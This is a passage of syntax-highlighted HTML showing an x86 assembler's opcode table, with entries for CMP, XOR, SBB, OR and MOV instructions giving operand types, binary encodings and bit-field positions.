    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00100100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0011101000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0011100000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0011001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0011000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00110100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">SBB</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001101000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001101000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000101000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000100000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8b</span><span class="sc0">             </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000001000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemOffs</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Acc</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemOffs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance8</span><span class="sc0">            </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10110000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100011000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000101000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000100000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Mem16</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Seg0</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000110000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">           </span><span class="sc5">Seg0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000111000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">             </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRn</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010000011000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">             </span><span class="sc5">CRn</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010001011000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">             </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRn</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010000111000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">             </span><span class="sc5">DRn</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010001111000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">             </span><span class="sc5">Reg32</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TRn</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010010011000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">             </span><span class="sc5">TRn</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Reg32</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010011011000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

